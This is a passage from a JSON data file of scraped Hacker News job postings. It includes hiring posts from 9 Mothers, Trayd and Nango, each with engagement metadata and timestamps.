      },
      "content_hash": "1401a5936e5bb5a31e2a9c6c542cf54b"
    },
    {
      "id": "540dbf58e85cec1f2e2683616e0a030f",
      "source": "hackernews",
      "source_id": "46779136",
      "title": "9 Mothers (YC X26, Defense Tech) Is Hiring",
      "content": "9 Mothers (YC X26, Defense Tech) Is Hiring",
      "url": "https://jobs.ashbyhq.com/9-mothers?utm_source=x8pZ4B3P3Q",
      "author_username": "ukd1",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329679",
      "published_at": "2026-01-27T07:31:29",
      "scraped_at": "2026-02-03T09:03:23.329680",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46779136",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
      },
      "content_hash": "0c9bfc9dcb47963a74d4e845e588993c"
    },
    {
      "id": "98a667e71316cdede9679368305bed66",
      "source": "hackernews",
      "source_id": "46778846",
      "title": "Trayd (YC S23) is hiring senior engineers in NYC",
      "content": "Trayd (YCS23) is building construction payroll + back office software. Payroll is one of the few domains where 99% accuracy is an F, so we obsess over correctness, reliability, and observability.<p>We recently hit a major growth milestone (57% month-over-month revenue growth, among other things), and weâ€™re hiring senior engineers in NYC (on-site) to help scale the product and the systems behind it as volume ramps. You would be joining a small but mighty eng team, all based in NYC.<p>Stack: TypeScript, Node, Postgres, Prisma, React &amp; React Native.<p>URL: <a href=\"https:&#x2F;&#x2F;www.ycombinator.com&#x2F;companies&#x2F;trayd&#x2F;jobs&#x2F;1Ez3l4b-senior-fullstack-software-engineer\">https:&#x2F;&#x2F;www.ycombinator.com&#x2F;companies&#x2F;trayd&#x2F;jobs&#x2F;1Ez3l4b-sen...</a>",
      "url": null,
      "author_username": "caratrayd",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329685",
      "published_at": "2026-01-27T07:00:22",
      "scraped_at": "2026-02-03T09:03:23.329686",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46778846",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
      },
      "content_hash": "873a2c172e0efdc15ed3a6f40c74435f"
    },
    {
      "id": "183ef2299a3cc5e09f8f1762b5263f26",
      "source": "hackernews",
      "source_id": "46753336",
      "title": "Nango (YC W23, Dev Infrastructure) Is Hiring Remotely",
      "content": "Nango (YC W23, Dev Infrastructure) Is Hiring Remotely",
      "url": "https://jobs.ashbyhq.com/Nango",
      "author_username": "bastienbeurier",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 1,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:03:23.329697",
      "published_at": "2026-01-25T07:02:01",
      "scraped_at": "2026-02-03T09:03:23.329699",
      "metadata": {
        "item_type": "job",
        "hn_url": "https://news.ycombinator.com/item?id=46753336",
        "kids_count": 0,
        "sections": [
          "jobs"
        ]
      },
      "content_hash": "87dccc2e57842f3e944d9709d118403b"
    }
  ]
}